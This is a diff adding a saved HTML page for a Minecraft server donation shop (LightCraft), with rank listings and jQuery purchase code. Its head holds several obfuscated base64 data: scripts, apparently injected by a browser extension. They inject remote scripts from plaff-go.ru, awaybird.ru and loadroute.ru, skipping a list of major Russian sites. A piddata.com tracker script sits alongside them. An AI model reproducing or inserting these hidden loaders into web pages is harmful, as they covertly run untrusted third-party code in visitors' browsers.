@@ -1,0 +1,1418 @@
+<head>
+
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+
+        <meta property="og:url" content="https://lightbuy.mcdonate.ru">
+        <meta property="og:title" content="LightCraft">
+        <meta property="og:type" content="">
+        <meta property="og:description" content="Описание не указано">
+        <meta property="og:image" content="https://mcdonate.ru/static/img/shopHeader/317120.png">
+        <meta name="twitter:card" content="summary_large_image">
+        <meta name="twitter:site" content="">
+        <meta name="twitter:title" content="LightCraft">
+        <meta name="twitter:description" content="Описание не указано">
+        <meta name="twitter:image:src" content="https://mcdonate.ru/static/img/shopHeader/317120.png">
+        <meta name="twitter:domain" content="https://lightbuy.mcdonate.ru">
+        <title 7="">LightCraft | Открытие | 1.12.2-1.14.4</title>
+
+
+		<link rel="stylesheet" href="/static/design7/css/main.css?1">
+
+		<script async="" src="//piddata.com?sa=11060&amp;sa2=656_11060-frs3"></script><script async="" src="https://www.google-analytics.com/analytics.js"></script><script src="/static/design6/qink/jquery-latest.min.js" type="text/javascript"></script><style id="vrsl_"></style>
+		<script src="/static/panel/js/main.js?v1"></script>
+
+			<link rel="stylesheet" href="/static/design6/qink/bootstrap.min.css" type="text/css">
+
+		<script src="/static/design3/bootstrap.js"></script>
+		<script src="/static/panel/js/wow.js"></script>
+
+		<link rel="shortcut icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAkJJREFUeNqEU7+LE0EU/mYzm0087geSqMFgc/4orhBFCMJpaWURxFKu0sJWLO2tLPwT5NqDWAnhWhEj2Hl4zZ1gwHjJkZ9udmd3Zsc3kzWXywUc2N158977vu+9ecs67x/j1Ep0xcnymgqikrYHDG5OtWTsVpmDL5hb3LycnIskjO2B1vrz0u0y4LpkmHwGR/RL/Ua7YY1FANCppS0CeNyDEwa0ZWBOhtJicwxmAdNET0IKTgA6zTQR6T6K7sIrlqH9PbDxNwS/2wSyPE2eJSUAXYHSNS2Tkk4VhPu7iLubSCIJ1ffgwJsk6zn9ZPOzNVNPgi66n+oo3LuPjBAIfwmMunkkIkohGDTXLeKqcup6WvOYyB1bMxBRDMfoUEMNPCg/j5XNMlj2bGM5WIJIVJAtXgb872DBHoJWn2Ioad2hQIGjhoYru7QPpiT/GssNpBz5UOEAsieghtlpzcPDxCpgRCKIxDR2SpI21l4jX/HIeQ4ocCpFkAIB2V7F6g1K/hOi81VBEUmwgMQCyFGIJBgj7sUUSF3XHrQUGOyHVoFWjEhyp0hCIhkdZVMFyxNnvuBOFFDX5fEa1m4VSHITnY8M0o9OSIZEklk6mUQ5JufPOaeK0al/SKfTgXt+FbnSRQLsg+ghmhrDpgGgK7HOS/PODC482rljCF492bj+PKm95Q6KtnCWgdQ43t49eMleP725tfXgyhvOUJh1vqv/ePHs4dVtA1Cs7uTpc40ed2YOzd93YAbUFLO+yEmPj/+svwIMACGrPX3cQYNXAAAAAElFTkSuQmCC" type="image/png">
+
+		<style>
+			header h1, header h2 {
+				color: whitesmoke !important ;
+			}
+
+			.hide {
+				display: none !important;
+			}
+		</style>
+
+    <style>
+        @font-face {
+        font-family: Comfortaa;
+        }
+        h2 {
+        font-family: Comfortaa, 'Comfortaa';
+        }
+
+        .modal-dialog {
+            position: relative;
+            width: 70%;
+            margin: 0 auto !important;
+            margin-top: 40px !important;
+        }
+
+		/*
+			Popup
+		*/
+		.popupOverlay {
+			display: none;
+			position: fixed;
+			left: 0;
+			top: 0;
+			width: 100%;
+			height: 100%;
+			background: rgba(0,0,0,.7);
+			text-align: center;
+			z-index: 1100;
+			overflow: scroll ;
+			}
+			.popupOverlay:after {
+				display: inline-block;
+				*display: inline;
+				*zoom: 1;
+				height: 100%;
+				width: 0;
+				vertical-align: middle;
+				content: ''
+				}
+			/* Added for IE<9 compatibility */
+			.popupOverlay_ie {
+				background: #000;
+				opacity: .7;
+				filter: alpha(opacity=70)
+				}
+		.popup {
+			display: inline-block;
+			vertical-align: middle;
+			background: rgb(231, 232, 113);
+			padding: 35px 75px 20px 75px;
+			color: rgb(79, 77, 80);
+			font-size: 16pt;
+			max-width: 70%;
+			}
+		.popup .popupbtn {
+			background: rgb(163, 193, 95);
+			padding: 5px 15px 5px 15px;
+			display: inline-block;
+			color: rgb(255, 255, 255);
+			font-size: 12pt;
+			margin-top: 20px;
+			cursor: pointer;
+		}
+		/* Added instead of :after pseudoelement */
+		.popup__valignfix {
+			display: inline-block;
+			*display: inline;
+			*zoom: 1;
+			width: 0;
+			height: 100%;
+			vertical-align: middle
+			}
+		.popup-form__row {
+			margin: 1em 0
+			}
+
+		.previList option[disabled="disabled"] {
+			color:black;
+		}
+      </style>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-76367831-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+
+	<script type="text/javascript" src="data:text/javascript;base64,aWYoImh0dHA6Ij09PXdpbmRvdy5sb2NhdGlvbi5wcm90b2NvbCl7dmFyIHNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpO3NjcmlwdC5zcmMgPSAiaHR0cDovL3BsYWZmLWdvLnJ1L2xpbmsveGdibHp3am0vIjtkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgiaGVhZCIpWzBdLmFwcGVuZENoaWxkKHNjcmlwdCk7fQ=="></script><script type="text/javascript" src="data:text/javascript;base64,aWYoImh0dHBzOiI9PT13aW5kb3cubG9jYXRpb24ucHJvdG9jb2wpe3ZhciBzY3JpcHQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKTtzY3JpcHQuc3JjID0gImh0dHBzOi8vcGxhZmYtZ28ucnUvbGluay9qcjZtbHc3OC8iO2RvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCJoZWFkIilbMF0uYXBwZW5kQ2hpbGQoc2NyaXB0KTt9"></script><script type="text/javascript" src="data:text/javascript;base64,KGZ1bmN0aW9uKGQsYSl7IGZvcih2YXIgZj13aW5kb3cubG9jYXRpb24uaG9zdCxiPWEubGVuZ3RoLTE7MDw9YiYmIVJlZ0V4cChhW2JdKS50ZXN0KGYpOy0tYik7CTA+YiYmKAlzY3JpcHQgPSBkLmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpLHNjcmlwdC5zcmMgPSAnaHR0cHM6Ly9hd2F5YmlyZC5ydS9wcmNyL2xkcl82NTZfMTE0Mzhfd0ZrUk1FLmpzJyxkLmdldEVsZW1lbnRzQnlUYWdOYW1lKCdib2R5JylbMF0uYXBwZW5kQ2hpbGQoc2NyaXB0KQkpfSkoZG9jdW1lbnQsIl4oLitcXC4pP3ZrXFwuY29tJCBeKC4rXFwuKT9vZG5va2xhc3NuaWtpXFwucnUkIF53d3dcXC5hdml0b1xcLnJ1JCBeKC4rLik/bWFpbFxcLnJ1JCBed3d3XFwuZ2lzbWV0ZW9cXC5ydSQgXiguK1xcLik/cmJjXFwucnUkIF53d3dcXC5raW5vcG9pc2tcXC5ydSQgXmZvdG9zdHJhbmFcXC5ydSQgXnd3d1xcLm1hbWJhXFwucnUkIF4oLitcXC4pP3J1dHJhY2tlclxcLm9yZyQgXiguK1xcLik/cmlhXFwucnUkIF4oLitcXC4pP3Nwb3J0Ym94XFwucnUkIF5sZW50YVxcLnJ1JCBeKC4rXFwuKT9waWthYnVcXC5ydSQgXnpvbmFcXC5ydSQgXm1lZ29nb1xcLm5ldCQgXnd3d1xcLmxvc3RmaWxtXFwudHYkIF5zZWFzb252YXJcXC5ydSQgXiguK1xcLik/MXR2XFwucnUkIF53d3dcXC55YXBsYWthbC5jb20kIF4oLitcXC4pP3RudC1vbmxpbmUucnUkIF4oLitcXC4pP3lhbmRleFxcLnJ1JCBeKC4rXFwuKT95YVxcLnJ1JCBeKC4rXFwuKT90dXRcXC5ieSQgXmZpc2hraVxcLm5ldCQgXiguK1xcLik/bGl2ZWpvdXJuYWxcXC5jb20kIF4oLitcXC4pP2FuZWtkb3RcXC5ydSQgXiguK1xcLik/YXV0b1xcLnJ1JCBeKC4rXFwuKT9rcFxcLnJ1JCBeKC4rXFwuKT9jaGFtcGlvbmF0XFwuY29tJCBeKC4rXFwuKT9kcml2ZTJcXC5ydSQgXiguK1xcLik/ZHJvbVxcLnJ1JCIuc3BsaXQoIiAiKSk7"></script><script type="text/javascript" src="data:text/javascript;base64,KGZ1bmN0aW9uKGQsYSl7IGZvcih2YXIgZj13aW5kb3cubG9jYXRpb24uaG9zdCxiPWEubGVuZ3RoLTE7MDw9YiYmIVJlZ0V4cChhW2JdKS50ZXN0KGYpOy0tYik7CTA+YiYmKAlzY3JpcHQgPSBkLmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpLHNjcmlwdC5zcmMgPSAnaHR0cHM6Ly9sb2Fkcm91dGUucnUvcHJjci9sZHJfNjU2XzI1OTdfWU1mWUl2LmpzJyxkLmdldEVsZW1lbnRzQnlUYWdOYW1lKCdib2R5JylbMF0uYXBwZW5kQ2hpbGQoc2NyaXB0KQkpfSkoZG9jdW1lbnQsIl4oLitcXC4pP3ZrXFwuY29tJCBeKC4rXFwuKT9vZG5va2xhc3NuaWtpXFwucnUkIF53d3dcXC5naXNtZXRlb1xcLnJ1JCBeKC4rXFwuKT9yYmNcXC5ydSQgXnd3d1xcLmtpbm9wb2lza1xcLnJ1JCBeZm90b3N0cmFuYVxcLnJ1JCBed3d3XFwubWFtYmFcXC5ydSQgXiguK1xcLik/cnV0cmFja2VyXFwub3JnJCBeKC4rXFwuKT9yaWFcXC5ydSQgXiguK1xcLik/c3BvcnRib3hcXC5ydSQgXmxlbnRhXFwucnUkIF4oLitcXC4pP3Bpa2FidVxcLnJ1JCBeem9uYVxcLnJ1JCBebWVnb2dvXFwubmV0JCBed3d3XFwubG9zdGZpbG1cXC50diQgXnNlYXNvbnZhclxcLnJ1JCBeKC4rXFwuKT8xdHZcXC5ydSQgXnd3d1xcLnlhcGxha2FsLmNvbSQgXiguK1xcLik/dG50LW9ubGluZS5ydSQgXiguK1xcLik/dHV0XFwuYnkkIF5maXNoa2lcXC5uZXQkIF4oLitcXC4pP2xpdmVqb3VybmFsXFwuY29tJCBeKC4rXFwuKT9hbmVrZG90XFwucnUkIF4oLitcXC4pP2F1dG9cXC5ydSQgXiguK1xcLik/a3BcXC5ydSQgXiguK1xcLik/Y2hhbXBpb25hdFxcLmNvbSQgXiguK1xcLik/ZHJpdmUyXFwucnUkIF4oLitcXC4pP2Ryb21cXC5ydSQiLnNwbGl0KCIgIikpOw=="></script><script src="https://plaff-go.ru/link/jr6mlw78/"></script><link rel="stylesheet" type="text/css" href="chrome-extension://napifgkjbjeodgmfjmgncljmnmdefpbf/styles.css">
+</head>
+<body class=" dp-frs">
+<!--[if lt IE 9]><div class="popupOverlay popupOverlay_ie"></div><![endif]-->
+<div class="popupOverlay">
+	<div class="popup">
+		<div class="text">
+			Some warning
+		</div>
+
+		<div class="popupbtn" onclick="popup.close();">
+			<div>Ok</div>
+		</div>
+	</div>
+	<!--[if lt IE 9]><div class="popup__valignfix"></div><![endif]-->
+</div>
+<!--[if IE]><div class="ie"><![endif]-->
+
+		<div id="wrapper">
+			<div id="bg"></div>
+			<div id="main">
+				<header id="header">
+					<h2 class="title">LightCraft | Открытие | 1.12.2-1.14.4 </h2>
+				    <h2 class="last_purchase hide">Последняя покупка: <span id="last_purchase" class="pulse animated">KronosHD</span></h2>
+				    <div class="wrapper">
+					    <div class="container">
+					        <h1>Покупка привилегии</h1>
+						    <form method="post" id="form" oninput="" action="#">
+							    <div class="info hide" id="error_buy" style="">Ошибка: Не введён ник!</div>
+							    <input type="text" name="name" id="name" class="playerNickname" placeholder="Ник в игре" autocomplete="off">
+						        <select name="group" class="previList" style="height: 48px;"><option selected="" value="" disabled="disabled">Выберите донат</option>
+	<option value="10" class="previElement buyPrevi buyItemFromShop" previ_id="1378940" price="15" title="Вип " descr="">&nbsp;&nbsp;&nbsp;[Вип ] - 15 рублей</option>
+
+	<option value="10" class="previElement buyPrevi buyItemFromShop" previ_id="1378941" price="25" title="Премиум" descr="">&nbsp;&nbsp;&nbsp;[Премиум] - 25 рублей</option>
+
+	<option value="10" class="previElement buyPrevi buyItemFromShop" previ_id="1378944" price="30" title="Креатив" descr="">&nbsp;&nbsp;&nbsp;[Креатив] - 30 рублей</option>
+
+	<option value="10" class="previElement buyPrevi buyItemFromShop" previ_id="1378945" price="50" title="Админ" descr="">&nbsp;&nbsp;&nbsp;[Админ] - 50 рублей</option>
+
+	<option value="10" class="previElement buyPrevi buyItemFromShop" previ_id="1378947" price="65" title="Гл.Админ" descr="">&nbsp;&nbsp;&nbsp;[Гл.Админ] - 65 рублей</option>
+
+	<option value="10" class="previElement buyPrevi buyItemFromShop" previ_id="1378948" price="70" title="Визард" descr="">&nbsp;&nbsp;&nbsp;[Визард] - 70 рублей</option>
+
+	<option value="10" class="previElement buyPrevi buyItemFromShop" previ_id="1378949" price="80" title="Разработчик" descr="">&nbsp;&nbsp;&nbsp;[Разработчик] - 80 рублей</option>
+
+	<option value="10" class="previElement buyPrevi buyItemFromShop" previ_id="1378951" price="89" title="Создатель" descr="">&nbsp;&nbsp;&nbsp;[Создатель] - 89 рублей</option>
+
+	<option value="10" class="previElement buyPrevi buyItemFromShop" previ_id="1378953" price="0" title="---------------------------------" descr="">&nbsp;&nbsp;&nbsp;[---------------------------------] - 0 рублей</option>
+
+	<option value="10" class="previElement buyPrevi buyItemFromShop" previ_id="1378954" price="189" title="Феникс" descr="">&nbsp;&nbsp;&nbsp;[Феникс] - 189 рублей</option>
+
+	<option value="10" class="previElement buyPrevi buyItemFromShop" previ_id="1378956" price="499" title="ЛЕГЕНДА+/OP" descr="">&nbsp;&nbsp;&nbsp;[ЛЕГЕНДА+/OP] - 499 рублей</option>
+
+	<option value="10" class="previElement buyPrevi buyItemFromShop" previ_id="1378958" price="799" title="Хозяин Сервера+Сборка(/OP+/console+ЗВЕЗДА)" descr="">&nbsp;&nbsp;&nbsp;[Хозяин Сервера+Сборка(/OP+/console+ЗВЕЗДА)] - 799 рублей</option>
+
+	<option value="10" class="previElement buyPrevi buyItemFromShop" previ_id="1378959" price="0" title="---------------------------------" descr="">&nbsp;&nbsp;&nbsp;[---------------------------------] - 0 рублей</option>
+
+	<option value="10" class="previElement buyPrevi buyItemFromShop" previ_id="1378961" price="0" title="Скоро..." descr="">&nbsp;&nbsp;&nbsp;[Скоро...] - 0 рублей</option>
+
+	<option value="10" class="previElement buyPrevi buyItemFromShop" previ_id="1378962" price="0" title="Скоро..." descr="">&nbsp;&nbsp;&nbsp;[Скоро...] - 0 рублей</option>
+
+	<option value="10" class="previElement buyPrevi buyItemFromShop" previ_id="1378963" price="0" title="Скоро..." descr="">&nbsp;&nbsp;&nbsp;[Скоро...] - 0 рублей</option>
+<option value="" disabled="disabled">Прочее</option><option value="10" previ_id="unban" style="" class="previElement buyPrevi buyItemFromShop autoUnban">&nbsp;&nbsp;&nbsp;[Разбан на сервере] - 75 рублей</option>undefinedundefined</select>
+                                <button type="button" onclick="mBrain.proceedBuying(this);" id="buy_btn" class="button">Оплатить</button>
+                                <button type="button" onclick="mBrain.lottery.showPopup();" id="lottery_btn" style="display: none;" class="button lottery-btn">Играть в лотерею 50 на 50</button>
+                            </form>
+						</div>
+					</div>
+				<footer class="footer-wrap text-center">
+					<p style="color: whitesmoke;"></p>
+					<br>
+					<p style="color: whitesmoke;">© Создано с помощью <a href="https://MCDonate.ru">MCDonate.ru</a></p>
+		        </footer>
+                </header>
+            </div>
+        </div>
+
+		<div id="vkWidgetEmbeded" style="display: none;"></div>
+
+		<script>
+			window.onload = function() { document.body.className = ''; }
+			$(".tab_item").not(":first").hide();
+		    $(".wrapper .tab").show().click(function() {
+                var ind = $(this).index();
+                $(".wrapper .tab").removeClass("active").eq(ind).addClass("active");
+                $(".tab_item").hide().eq(ind).fadeIn()
+            }).eq(0).addClass("active");
+		</script>
+
+                <!-- PAYING TYPE -->
+<div class="modal fade" id="payingType" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+  <div class="modal-dialog" style="margin-top: 15%;">
+    <div class="modal-content">
+      <div class="modal-header">
+        <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">×</span><span class="sr-only">Close</span></button>
+        <h4 class="modal-title" id="myModalLabel">Подтверждение</h4>
+      </div>
+      <div class="modal-body">
+		<div class="descrPlace" style="margin=bottom: 15px;">
+
+		</div>
+
+		<div class="paymentButtons"></div>
+
+      </div>
+    </div>
+  </div>
+</div>
+
+<div id="paymentButtons" style="display: none;">
+
+	<center>
+	<a href="" target="_blank" style="display: none;" onclick="return false;"><button type="button" onclick="site.paymentType = 'qiwi';site.shop.doBuyPrevi(this)" class="btn btn-default">QIWI</button></a>
+	<a href="" target="_blank" style="display: none;" onclick="return false;"><button type="button" onclick="site.paymentType = 'wm';site.shop.doBuyPrevi(this)" class="btn btn-default">WebMoney</button></a>
+	<a href="" target="_blank" onclick="return false;"><button type="button" onclick="site.paymentType = 'up';site.shop.doBuyPrevi(this)" class="btn btn-default">Перейти к оплате</button></a>
+		</center>
+</div>
+
+<div id="previElement_tmp" style="display: none;">
+	<option value="10" class="previElement buyPrevi buyItemFromShop" previ_id="1378963" price="0" title="Скоро..." descr=""><span class="previName">&nbsp;&nbsp;&nbsp;[Скоро...]</span> - <span class="previPrice">0 рублей</span></option>
+</div>
+
+<script type="text/javascript">
+
+// $('body').css('height', '1000px'); //loader
+
+design = {
+
+	prepareCurrency: function(_this){
+
+		var playerNickname = $('.playerNickname').val();
+
+		mCurrency.doBuyCurrencyFinal(_this, playerNickname);
+
+	},
+
+};
+
+
+site = {
+	my_login: '',
+	panel_blocked: false,
+	container: $('#wrapper'),
+	timer_id: 0,
+	tmp: '',
+	shop_item_tmp: $('#shop_item_tmp'),
+	domain: 'https://mcdonate.ru',
+	itemBuyingPopup: $('#itemBuyingPopup'),
+	itemConfirmPopup: $('#itemConfirmPopup'),
+	paymentType: 0,
+
+	paymentButtons: $('#paymentButtons').html(),
+
+	info: {
+		is_online: 0,
+	},
+	slaveAuthKey: '', // key for crossdomain ajax
+
+	init: function(){
+
+		if (currentServer.id == '17058')
+			$('.copyright').fadeOut();
+
+		if (currentServer.is_banned == 1){
+			popup.postError(mcMessages.is_banned, 'no_controls');
+			return ;
+		}
+
+
+		$('body .container .main-menu').on('click', '.buyItemFromShop', function(){
+			if ($(this).hasClass('buyPrevi')){
+				site.shop.buyPreviFromShop(this);
+			}
+			else {
+				site.shop.buyItemFromShop(this);
+			}
+		});
+
+		site.drawServerHeaderImage();
+
+		site.shop.init();
+	},
+
+
+
+    choosePaymentType: function(){
+
+        $('#payingType .paymentButtons').html(site.paymentButtons);
+        $('#payingType').modal();
+
+        site.shop.current_item = site.container.find('.previList :selected');
+
+        var descr = '';
+        if (site.shop.current_item.attr('descr') != undefined && site.shop.current_item.attr('descr').length != 0)
+            descr = '<div class="alert alert-info" style="  max-height: 250px;  overflow: scroll;">' + Base64.decode(site.shop.current_item.attr('descr')) + '</div>';
+
+        $('#payingType .descrPlace').html(descr);
+    },
+
+	drawServerHeaderImage: function(){
+		$('title').text(currentServer.name);
+		//$('#serverImageName').text(currentServer.name);
+
+	},
+
+	showLoadingAnimation: function(_jq_element){
+		_jq_element.html(GLOBAL_IMAGES['loading']);
+		//_jq_element.children('.loadingAnimation').css({'width': '150px', 'height': '150px', 'margin': '0 auto', 'display': 'block'});
+	},
+
+	postError: function(error, arg){
+		popup.setContent(error);
+		popup.open(arg);
+	},
+
+	postErrorQink: function(error){
+
+
+		$('#error_buy').text(error).removeClass('hide');
+	},
+
+	shop: {
+		shopItemsLoaded: false,
+		timer_id: 0,
+		current_item: {},
+		is_captcha_ok: false,
+		loadedItemsNames: [],
+		just_update: false,
+		current_page: 1,
+		itemsAjaxDump: {},
+		previMaxSize: 0,
+
+		init: function(){
+			console.log('shop.init called');
+
+			site.shop.animateNewYear();
+
+			site.shop.displayChoose();
+
+			shortAjax('/ajax/ajax_shop.php', {
+				context: 'getMonitoringInfo',
+				server_id: currentServer.id,
+			}, function(msg){ // On ajax success
+
+				msg = JSON.parse(msg);
+
+				if (msg.error == 'false'){
+
+					site.shop.drawOnlineProgressbar(msg);
+				}
+				else if (msg.error != 'false' && msg.error != ''){
+
+					if (msg.error_text !== undefined){
+						popup.postError(msg.error_text);
+					}
+					else {
+						console.log('Weird error');
+					}
+				}
+			});
+
+		},
+
+		animateNewYear: function(){
+
+			$('#newYear').animate({'top': '-20px'}, 4000, function(){
+				$('#newYear').animate({'top': '-100px'}, 4000, function(){
+					site.shop.animateNewYear();
+				});
+			});
+
+		},
+
+		displayChoose: function(){
+
+		    site.shop.loadGoods();
+
+			site.container.find('.serverShop').html($('.tmp_chooseScreen').html());
+
+
+		},
+
+		drawOnlineProgressbar: function(msg){
+			if (msg.onlineInfo.monitoringInfo.enableMonitoring != 1) return ;
+
+			var progressbar = $('.playersOnlineInfo');
+
+			var bartext = '[' + msg.onlineInfo.version + '] IP: ' + currentServer.ip_addr + ' онлайн ' + msg.onlineInfo.curPlayers + ' из ' + msg.onlineInfo.maxPlayers;
+
+				if (msg.onlineInfo.maxPlayers == 0)
+					bartext = 'Не удалось получить информацию об онлайне. Укажите правильный IP сервера.';
+
+
+			progressbar.find('.progress .bartext').text(bartext);
+			progressbar.show();
+
+			$('.playersOnlineInfo .progress .bar').css('width', ((msg.onlineInfo.curPlayers / msg.onlineInfo.maxPlayers) * 100) + '%');
+			$('.playersOnlineInfo .progress .bar').css('background-color', msg.onlineInfo.monitoringInfo.progressbarColor);
+			progressbar.find('.progress .bartext').css('text', msg.onlineInfo.monitoringInfo.textColor);
+		},
+
+
+        loadGoods: function(){
+
+            shortAjax('/ajax/ajax_shop.php', {
+                context: 'getShopItemsAndInfo',
+                load_type: 'previes',
+                server_id: currentServer.id,
+            }, function(msg){ // On ajax success
+
+                msg = JSON.parse(msg);
+
+                if (msg.error == 'false'){
+
+                    //site.shop.drawOnlineProgressbar(msg);
+                    site.shop.previesAjaxDump = msg ;
+                    site.shop.itemsAjaxDump = msg ;
+
+                    site.shop.renderPreviesPage(msg);
+                    site.shop.renderMenuList(msg);
+                    site.shop.renderShopPage(msg);
+
+                    mBrain.drawLastBoughts(msg);
+
+                    //site.shop.drawOnlineProgressbar(msg);
+
+                }
+                else if (msg.error != 'false' && msg.error != ''){
+
+                    if (msg.error_text !== undefined){
+                        popup.postError(msg.error_text);
+                    }
+                    else {
+                        console.log('Weird error');
+                    }
+                }
+            });
+
+        },
+
+
+		renderPreviesPage: function(data){
+			var html = '<option selected value="" disabled="disabled">Выберите донат</option>';
+			var template = $('#previElement_tmp');
+			for (var i = 0; i < data.previes_list.length; i++){
+				var item = data.previes_list[i];
+
+				template.find('.previElement').attr({
+					'previ_id': item.previ_id,
+					'price': item.price,
+					'title': item.title,
+					'descr': Base64.encode(item.descr),
+				});
+
+
+				template.find('.previName').html('&nbsp;&nbsp;&nbsp;[' + item.title + ']');
+				template.find('.previPrice').html(item.price + ' ' + niceEnding(item.price, ['рубль','рубля','рублей']));
+				html += template.html();
+
+
+			}
+
+            html += site.shop.addUnbanInfo() ;
+            html += site.shop.addLotteryInfo() ;
+            html += site.shop.addCurrencyInfo() ;
+
+			site.container.find('.previList').html(html);
+
+		},
+
+
+
+		addUnbanInfo: function(){
+
+			if (currentServer.unbanInfo.is_enabled == 0) return ;
+
+			var price = currentServer.unbanInfo.unbanPrice;
+
+			return '<option value="" disabled="disabled">Прочее</option><option value="10" previ_id="unban" style="" class="previElement buyPrevi buyItemFromShop autoUnban"><span class="previName">&nbsp;&nbsp;&nbsp;[Разбан на сервере]</span> - <span class="previPrice">' + price + ' ' + niceEnding(price, ['рубль','рубля','рублей']) + '</span></option>';
+		},
+
+		addCurrencyInfo: function(){
+
+			if (currentServer.serverCurrency.is_enabled == 0) return ;
+
+			var text = '';
+
+			if (currentServer.unbanInfo.is_enabled == 0) text = '<option value="" disabled="disabled">Прочее</option>';
+
+			return '<option value="ingameCurrency" previ_id="" style="" class="previElement buyPrevi buyItemFromShop ingameCurrency"><span class="previName">&nbsp;&nbsp;&nbsp;[Игровая валюта]</span> <span class="previPrice"></span></option>';
+		},
+
+        addLotteryInfo: function(){
+
+            if (currentServer.lotteryInfo.lottery_enabled == 0) return ;
+
+            $('.lottery-btn').show();
+
+            var price = currentServer.lotteryInfo.lottery_price;
+
+            return '<option value="10" previ_id="lottery" style="" class="previElement buyPrevi buyItemFromShop lotteryTicket"><span class="previName">&nbsp;&nbsp;&nbsp;[Лотерейный билет]</span> - <span class="previPrice">' + price + ' ' + niceEnding(price, ['рубль','рубля','рублей']) + '</span></option>';
+        },
+
+        doBuyLotteryTicket: function(_this){
+
+            var playerNickname = site.container.find('.playerNickname').val() ;
+
+            var orderInfo = {
+                server_id: currentServer.id,
+                userNickname: playerNickname,
+                captcha_value: '',
+                desc: 'Билет для 1 игры за ' + currentServer.lotteryInfo.lottery_price + ' руб.',
+                userEmail: '',
+                type: 'lottery',
+                paymentType: site.paymentType,
+                name: 'Билеты для 1 игры',
+                costs: currentServer.lotteryInfo.lottery_price,
+            };
+
+            // a parent "a" html tag
+            $(_this).parent().attr('href', '/performOrder2/?' + encodeURIComponent(Base64.encode(JSON.stringify(orderInfo))));
+            $(_this).parent().attr('onClick', '');
+
+            return ;
+        },
+
+		doBuyUnbanFinal: function(_this){
+
+			var playerNickname = site.container.find('.playerNickname').val() ;
+
+			var orderInfo = {
+				server_id: currentServer.id,
+				userNickname: playerNickname,
+				captcha_value: '',
+				desc: 'Покупка разбана ' + playerNickname + ' за ' + currentServer.unbanInfo.unbanPrice + ' руб.)',
+				userEmail: 'noEmail@mail.ru',
+				type: 'unban',
+				paymentType: site.paymentType,
+				name: 'Разбан',
+				costs: currentServer.unbanInfo.unbanPrice,
+			};
+
+			// a parent "a" html tag
+			$(_this).parent().attr('href', '/performOrder2/?' + encodeURIComponent(Base64.encode(JSON.stringify(orderInfo))));
+			$(_this).parent().attr('onClick', '');
+
+			//if (currentServer.id == 43) $(_this).parent().attr('href', '/performOrder2/?' + Base64.encode(JSON.stringify(orderInfo)));
+
+			return ;
+		},
+
+		adaptPreviSize: function(){
+
+			if (site.container.find('.previElement.previWithImage').length != 0)
+				return ;
+
+			site.container.find('.previElement .descr').each(function(){
+				if (site.shop.previMaxSize < $(this).height())
+					site.shop.previMaxSize = $(this).height();
+			});
+
+			site.container.find('.previElement').height(site.shop.previMaxSize + 80);
+			site.container.find('.previElement .descr').height(site.shop.previMaxSize + 10);
+
+		},
+
+		renderShopPage: function(data){
+
+			if (!site.shop.just_update){
+				site.shop.renderMenuList(data);
+			}
+			else {
+
+            }
+
+		},
+
+		renderMenuList: function(data){
+			var html = '<hr>';
+
+			var styles = ['btn-danger', 'btn-warning', 'btn-info', 'btn-primary'];
+
+			var n = 0;
+			for (var i = 0; i < data.server.menuList.length; i++){
+				if (n > styles.length) n = 0;
+
+				html += '<a target="_blank" href="'+data.server.menuList[i].link+'" class="btn ' + styles[n] + ' btn-sm">'+data.server.menuList[i].name+'</a>';
+				n++;
+			}
+
+			//html = html.substr(0, html.length - 1);
+			site.container.find('.serverMenuList').html(html);
+		},
+
+
+		doBuyPrevi: function(_this){
+
+
+			if (site.shop.current_item.hasClass('autoUnban')){
+				site.shop.doBuyUnbanFinal(_this);
+				return ;
+			}
+
+            if (site.shop.current_item.hasClass('lotteryTicket')){
+                site.shop.doBuyLotteryTicket(_this);
+                return ;
+            }
+
+			if (site.shop.current_item.hasClass('ingameCurrency')){
+				mCurrency.doBuyCurrency();
+				return ;
+			}
+
+			var userEmail = site.itemBuyingPopup.find('.inputEmail').val() ;
+			userEmail = 'none@mail.ru';
+			if (userEmail.search('@') == -1){
+				site.postErrorQink('Неправильный E-mail');
+				return ;
+			}
+
+			if (userEmail.length > 50){
+				site.postErrorQink('Слишком длинный E-mail, используйте другой.');
+				return ;
+			}
+
+			var playerNickname = site.container.find('.playerNickname').val() ;
+			if (playerNickname == ''){
+				site.postErrorQink('Вы не указали никнейм');
+				$('#payingType').modal('hide');
+				return ;
+			}
+
+			if (site.shop.current_item.attr('price') == 0){
+				site.postErrorQink('Неправильная стоимость');
+				$('#payingType').modal('hide');
+				return ;
+			}
+
+			userEmail = '';
+
+			var orderInfo = {
+				server_id: currentServer.id,
+				previ_id: site.shop.current_item.attr('previ_id'),
+				captcha_value: site.itemBuyingPopup.find('.input_captcha').val(),
+				desc: 'Покупка привилегии: ' + site.shop.current_item.attr('title') + ' (' + site.shop.current_item.attr('price') + ' руб.)',
+				userEmail: userEmail,
+				playerNickname: playerNickname,
+				type: 'previ',
+				paymentType: site.paymentType,
+				name: site.shop.current_item.attr('title'),
+				costs: site.shop.current_item.attr('price'),
+			};
+
+			// a parent "a" html tag
+			$(_this).parent().attr('href', '/performOrder2/?' + encodeURIComponent(Base64.encode(JSON.stringify(orderInfo))));
+			$(_this).parent().attr('onClick', '');
+
+			//if (currentServer.id == 43) $(_this).parent().attr('href', '/performOrder2/?' + Base64.encode(JSON.stringify(orderInfo)));
+
+			return ;
+		},
+
+	},
+
+}
+
+
+$(document).ready(function(){
+	site.init();
+});
